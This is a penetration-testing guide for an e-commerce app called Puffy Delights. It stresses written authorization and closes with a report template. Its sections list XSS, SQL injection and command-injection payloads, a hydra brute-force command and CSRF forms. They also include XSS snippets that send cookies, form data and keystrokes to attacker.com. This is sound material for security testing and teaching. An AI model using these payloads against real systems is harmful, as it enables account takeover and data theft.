# Penetration Testing Guide for Puffy Delights

## Overview

This guide provides a structured approach to penetration testing for the Puffy Delights e-commerce application, focusing on identifying security vulnerabilities through simulated attacks.

---

## 🎯 Penetration Testing Methodology

### Testing Phases
1. **Reconnaissance** - Information gathering
2. **Scanning** - Vulnerability identification
3. **Enumeration** - Service and application analysis
4. **Exploitation** - Attempting to exploit vulnerabilities
5. **Post-Exploitation** - Assessing impact and persistence
6. **Reporting** - Documenting findings and recommendations

### Testing Scope
- Web application security
- API security
- Database security
- Authentication mechanisms
- Session management
- Input validation
- Business logic flaws

---

## 🔍 Reconnaissance Phase

### Information Gathering

#### Technology Stack Identification
```bash
# Identify web technologies
whatweb http://localhost:5173
builtwith.com (for production sites)

# Check HTTP headers
curl -I http://localhost:5173

# Analyze JavaScript frameworks
# Look for React, Vite, etc. in source code
```

#### Application Mapping
```bash
# Directory and file enumeration
dirb http://localhost:5173 /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://localhost:5173 -w /usr/share/wordlists/dirb/common.txt

# Common endpoints to check
/admin
/api
/config
/backup
/.git
/.env
/robots.txt
/sitemap.xml
```

#### Source Code Analysis
```bash
# Check for exposed source code
curl http://localhost:5173/.git/
curl http://localhost:5173/package.json
curl http://localhost:5173/.env

# Analyze client-side JavaScript
# Look for hardcoded credentials, API keys, etc.
```

---

## 🔬 Vulnerability Scanning

### Automated Security Scanning

#### OWASP ZAP Full Scan
```bash
# Start ZAP daemon
docker run -u zap -p 8080:8080 -i owasp/zap2docker-stable zap.sh -daemon -host 0.0.0.0 -port 8080

# Run spider scan
zap-cli spider http://localhost:5173

# Run active scan
zap-cli active-scan http://localhost:5173

# Generate report
zap-cli report -o zap-report.html -f html
```

#### Nikto Web Vulnerability Scanner
```bash
nikto -h http://localhost:5173 -Format htm -output nikto-report.html
```

#### SQLMap for SQL Injection Testing
```bash
# Test specific parameter for SQL injection
sqlmap -u "http://localhost:5173/api/orders" --data="id=1" --method=POST

# Test all forms automatically
sqlmap -u "http://localhost:5173" --forms --batch
```

---

## 💻 Manual Penetration Testing

### 1. Authentication Testing

#### Username Enumeration
```bash
# Test if application reveals valid usernames
curl -X POST http://localhost:5173/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com","password":"wrongpass"}'

curl -X POST http://localhost:5173/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@test.com","password":"wrongpass"}'

# Look for different response times or messages
```

#### Brute Force Testing
```bash
# Use hydra for brute force (testing purposes only)
hydra -l admin@test.com -P /usr/share/wordlists/rockyou.txt \
  localhost -s 5173 http-post-form \
  "/api/login:email=^USER^&password=^PASS^:F=Invalid"
```

#### Session Management Testing
```javascript
// Test session security in browser console
// 1. Login to the application
// 2. Check session storage/cookies
console.log('Local Storage:', localStorage);
console.log('Session Storage:', sessionStorage);
console.log('Cookies:', document.cookie);

// 3. Test session fixation
// Copy session ID, logout, login with different user
// Check if session ID changes

// 4. Test session timeout
// Wait for extended period, try to perform actions
```

### 2. Input Validation Testing

#### XSS (Cross-Site Scripting) Testing
```javascript
// Test XSS in all input fields
const xssPayloads = [
  // Basic XSS
  '<script>alert("XSS")</script>',
  
  // Event handler XSS
  '<img src="x" onerror="alert(\'XSS\')">',
  '<svg onload="alert(\'XSS\')">',
  
  // JavaScript URL
  'javascript:alert("XSS")',
  
  // HTML5 XSS
  '<input onfocus="alert(\'XSS\')" autofocus>',
  '<video><source onerror="alert(\'XSS\')">',
  
  // Filter bypass attempts
  '<script>alert(String.fromCharCode(88,83,83))</script>',
  '<img src="javascript:alert(\'XSS\')">',
  
  // DOM-based XSS
  'data:text/html,<script>alert("XSS")</script>',
];

// Test in:
// - Customer name field
// - Email field  
// - Address field
// - Product search
// - Any text areas
```

#### SQL Injection Testing
```javascript
// SQL injection payloads for manual testing
const sqlPayloads = [
  // Basic SQL injection
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "' UNION SELECT null,username,password FROM users --",
  
  // Blind SQL injection
  "' AND (SELECT COUNT(*) FROM users) > 0 --",
  "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --",
  
  // Time-based blind SQL injection
  "'; WAITFOR DELAY '00:00:05' --",
  "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5)) --",
  
  // NoSQL injection (for MongoDB)
  "'; return true; //",
  "{\"$ne\": null}",
];

// Test in:
// - Login forms
// - Search functionality
// - Order ID lookups
// - Product filters
```

#### Command Injection Testing
```bash
# Test for command injection in file operations
# If the app has any file upload/processing features

# Basic command injection payloads
; ls -la
| whoami
& ping -c 5 google.com
`id`
$(whoami)

# URL-encoded versions
%3B%20ls%20-la
%7C%20whoami
%26%20ping%20-c%205%20google.com
```

### 3. Business Logic Testing

#### Price Manipulation Testing
```javascript
// Test price manipulation scenarios
const testPriceManipulation = async () => {
  // 1. Add item to cart
  // 2. Intercept request and modify price
  // 3. Complete checkout
  // 4. Check if modified price is accepted
  
  const orderData = {
    items: [{
      id: 1,
      price: 0.01,  // Modified from original price
      quantity: 1
    }],
    total: 0.01
  };
  
  // Send modified order
  const response = await fetch('/api/orders', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(orderData)
  });
};
```

#### Quantity Manipulation Testing
```javascript
// Test negative quantities, overflow values
const testQuantityManipulation = async () => {
  const testQuantities = [
    -1,           // Negative quantity
    0,            // Zero quantity
    999999999,    // Large quantity
    1.5,          // Decimal quantity
    "abc",        // String quantity
    null,         // Null quantity
    undefined     // Undefined quantity
  ];
  
  for (const qty of testQuantities) {
    console.log(`Testing quantity: ${qty}`);
    // Test adding to cart with each quantity
  }
};
```

#### Order Status Manipulation
```javascript
// Test unauthorized order status changes
const testOrderManipulation = async () => {
  // Try to access other users' orders
  for (let orderId = 1; orderId <= 100; orderId++) {
    const response = await fetch(`/api/orders/${orderId}`);
    if (response.ok) {
      console.log(`Accessible order: ${orderId}`);
    }
  }
  
  // Try to modify order status without authorization
  const response = await fetch('/api/orders/1', {
    method: 'PATCH',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({status: 'delivered'})
  });
};
```

### 4. API Security Testing

#### API Endpoint Discovery
```bash
# Discover API endpoints
# Check common patterns
curl http://localhost:5173/api/
curl http://localhost:5173/api/v1/
curl http://localhost:5173/api/users
curl http://localhost:5173/api/admin
curl http://localhost:5173/api/orders
curl http://localhost:5173/api/desserts

# Test HTTP methods
for method in GET POST PUT PATCH DELETE; do
  curl -X $method http://localhost:5173/api/orders
done
```

#### API Parameter Testing
```javascript
// Test API parameter manipulation
const testAPIParameters = async () => {
  // Test limit/pagination manipulation
  await fetch('/api/orders?limit=999999');
  await fetch('/api/orders?page=-1');
  
  // Test filter bypass
  await fetch('/api/orders?user_id=1'); // Try accessing other users' data
  
  // Test SQL injection in parameters
  await fetch('/api/orders?id=1\' OR \'1\'=\'1');
  
  // Test NoSQL injection
  await fetch('/api/orders?user_id[$ne]=null');
};
```

#### Rate Limiting Testing
```bash
# Test API rate limiting
for i in {1..1000}; do
  curl -s http://localhost:5173/api/orders &
done
wait

# Check if rate limiting is enforced
# Look for 429 Too Many Requests responses
```

### 5. File Upload Testing (if applicable)

#### Malicious File Upload
```bash
# Create test files for upload testing
echo '<?php echo "Test"; ?>' > test.php
echo '<script>alert("XSS")</script>' > test.html

# Test file extension bypass
mv test.php test.php.jpg
mv test.php test.jpg.php

# Test MIME type bypass
# Upload files with manipulated Content-Type headers
```

### 6. Admin Panel Testing

#### Admin Authentication Bypass
```bash
# Test direct access to admin endpoints
curl http://localhost:5173/admin
curl http://localhost:5173/admin/api/orders
curl http://localhost:5173/admin/api/desserts

# Test authentication bypass techniques
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:5173/admin
curl -H "X-Real-IP: 127.0.0.1" http://localhost:5173/admin
curl -H "X-Original-URL: /admin" http://localhost:5173/
```

#### Privilege Escalation Testing
```javascript
// Test horizontal privilege escalation
const testPrivilegeEscalation = async () => {
  // Login as regular user
  // Try to access admin functions
  
  const adminActions = [
    '/api/admin/desserts',
    '/api/admin/orders',
    '/api/admin/users'
  ];
  
  for (const action of adminActions) {
    const response = await fetch(action);
    if (response.ok) {
      console.log(`Unauthorized access to: ${action}`);
    }
  }
};
```

---

## 🚀 Exploitation Techniques

### 1. SQL Injection Exploitation

#### Data Extraction
```sql
-- Extract user information
' UNION SELECT username, password, email FROM users --

-- Extract database structure
' UNION SELECT table_name, column_name FROM information_schema.columns --

-- Extract sensitive data
' UNION SELECT credit_card, expiry_date FROM payment_info --
```

#### Time-Based Blind SQL Injection
```sql
-- Test for time delays
'; IF (1=1) WAITFOR DELAY '00:00:05' --
' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5)) --

-- Extract data character by character
' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1) > 64 AND SLEEP(5) --
```

### 2. XSS Exploitation

#### Session Hijacking
```javascript
// XSS payload to steal session cookies
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>

// XSS payload to capture form data
<script>
  document.addEventListener('submit', function(e) {
    var formData = new FormData(e.target);
    var data = {};
    for (var [key, value] of formData.entries()) {
      data[key] = value;
    }
    fetch('http://attacker.com/capture.php', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

#### Keylogger XSS
```javascript
<script>
  document.addEventListener('keypress', function(e) {
    var img = new Image();
    img.src = 'http://attacker.com/keylog.php?key=' + e.key;
  });
</script>
```

### 3. CSRF Exploitation

#### CSRF Attack Examples
```html
<!-- CSRF attack to change admin settings -->
<form action="http://localhost:5173/api/admin/settings" method="POST" style="display:none;">
  <input name="setting" value="malicious_value">
  <input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>

<!-- CSRF attack to create admin user -->
<img src="http://localhost:5173/api/admin/users?action=create&username=attacker&password=pass&role=admin">
```

---

## 📊 Penetration Testing Tools

### Essential Tools

#### Web Application Testing
```bash
# Burp Suite Community Edition
# Download from: https://portswigger.net/burp

# OWASP ZAP
docker pull owasp/zap2docker-stable

# Nikto
apt-get install nikto

# Dirb/Gobuster
apt-get install dirb gobuster
```

#### Database Testing
```bash
# SQLMap
git clone https://github.com/sqlmapproject/sqlmap.git

# NoSQL injection tools
git clone https://github.com/codingo/NoSQLMap.git
```

#### Custom Testing Scripts
```javascript
// Custom vulnerability scanner script
const PenetrationTester = {
  baseUrl: 'http://localhost:5173',
  
  async testXSS(payload, field) {
    const response = await fetch(`${this.baseUrl}/api/test`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({[field]: payload})
    });
    
    const text = await response.text();
    return text.includes(payload.replace(/[<>]/g, ''));
  },
  
  async testSQLI(payload, parameter) {
    const response = await fetch(`${this.baseUrl}/api/data?${parameter}=${payload}`);
    const text = await response.text();
    
    // Check for SQL error messages
    const sqlErrors = ['sql syntax', 'mysql error', 'postgresql error'];
    return sqlErrors.some(error => text.toLowerCase().includes(error));
  },
  
  async testAuthBypass(endpoint) {
    const response = await fetch(`${this.baseUrl}${endpoint}`, {
      method: 'GET'
    });
    
    return response.status === 200;
  }
};
```

---

## 📋 Testing Scenarios

### Scenario 1: Customer Account Takeover
```javascript
// Attempt to takeover customer accounts
const testAccountTakeover = async () => {
  // 1. Test password reset function
  await fetch('/api/password-reset', {
    method: 'POST',
    body: JSON.stringify({email: 'victim@example.com'})
  });
  
  // 2. Test session fixation
  // 3. Test CSRF on account settings
  // 4. Test XSS to steal sessions
};
```

### Scenario 2: Payment System Exploitation
```javascript
// Test payment manipulation
const testPaymentExploit = async () => {
  // 1. Intercept payment request
  // 2. Modify amount to $0.01
  // 3. Submit order
  // 4. Check if payment validation occurs server-side
  
  const maliciousOrder = {
    items: [{id: 1, quantity: 1, price: 2999}], // Original price $29.99
    total_cents: 1, // Modified to $0.01
    payment: {amount: 1}
  };
  
  return await fetch('/api/orders', {
    method: 'POST',
    body: JSON.stringify(maliciousOrder)
  });
};
```

### Scenario 3: Admin Panel Compromise
```javascript
// Test admin panel security
const testAdminCompromise = async () => {
  // 1. Attempt direct access
  // 2. Test authentication bypass
  // 3. Test privilege escalation
  // 4. Test CSRF on admin functions
  
  const tests = [
    '/admin',
    '/admin/api/orders',
    '/admin/api/users',
    '/api/admin/settings'
  ];
  
  for (const test of tests) {
    const response = await fetch(test);
    console.log(`${test}: ${response.status}`);
  }
};
```

---

## 📄 Penetration Test Report Template

### Executive Summary
- **Test Scope**: [Define what was tested]
- **Test Duration**: [Start and end dates]
- **Critical Findings**: [Number of critical vulnerabilities]
- **Risk Level**: [Overall risk assessment]

### Methodology
- Reconnaissance techniques used
- Tools employed
- Testing approach

### Findings Summary
| Vulnerability | Severity | Status | CVSS Score |
|---------------|----------|---------|------------|
| SQL Injection | Critical | Open | 9.3 |
| XSS | High | Open | 7.2 |
| Weak Authentication | Medium | Open | 5.4 |

### Detailed Findings

#### Finding 1: SQL Injection in Order API
**Severity**: Critical  
**CVSS Score**: 9.3  

**Description**: The order API endpoint is vulnerable to SQL injection attacks.

**Evidence**:
```sql
POST /api/orders
{"id": "1'; DROP TABLE users; --"}
```

**Impact**: 
- Complete database compromise
- Data theft
- Service disruption

**Recommendation**:
- Use parameterized queries
- Implement input validation
- Apply principle of least privilege

#### Finding 2: Cross-Site Scripting (XSS)
**Severity**: High  
**CVSS Score**: 7.2  

**Description**: User input is not properly sanitized, allowing XSS attacks.

**Evidence**:
```html
<script>alert('XSS')</script>
```

**Impact**:
- Session hijacking
- Malicious code execution
- User account compromise

**Recommendation**:
- Sanitize all user inputs
- Use Content Security Policy
- Encode output data

### Risk Assessment Matrix
| Likelihood | Impact | Risk Level |
|------------|--------|------------|
| High | High | Critical |
| High | Medium | High |
| Medium | High | High |
| Medium | Medium | Medium |

### Remediation Timeline
- **Critical Issues**: Fix within 24-48 hours
- **High Issues**: Fix within 1 week
- **Medium Issues**: Fix within 2 weeks
- **Low Issues**: Fix within 1 month

---

## 🔧 Post-Exploitation Activities

### Maintaining Access
- Test for backdoors
- Check for persistent XSS
- Verify session management flaws

### Lateral Movement
- Test privilege escalation
- Check for additional vulnerabilities
- Map internal network (if applicable)

### Data Exfiltration Testing
- Test data access controls
- Verify encryption at rest
- Check backup security

---

## ⚠️ Legal and Ethical Considerations

### Before Testing
- **Get Written Permission**: Always have explicit authorization
- **Define Scope**: Clearly define what can and cannot be tested
- **Set Boundaries**: Establish limits on testing activities
- **Plan for Incidents**: Have incident response procedures ready

### During Testing
- **Document Everything**: Keep detailed logs of all activities
- **Minimize Impact**: Avoid disrupting normal operations
- **Respect Data**: Don't access/modify sensitive data unnecessarily
- **Stop if Harmful**: Cease testing if harm could occur

### After Testing
- **Secure Cleanup**: Remove any test data or backdoors
- **Responsible Disclosure**: Report findings appropriately
- **Provide Remediation**: Offer concrete fix recommendations
- **Follow Up**: Verify fixes are properly implemented

---

This penetration testing guide provides a comprehensive framework for security testing while emphasizing the importance of authorization and responsible testing practices.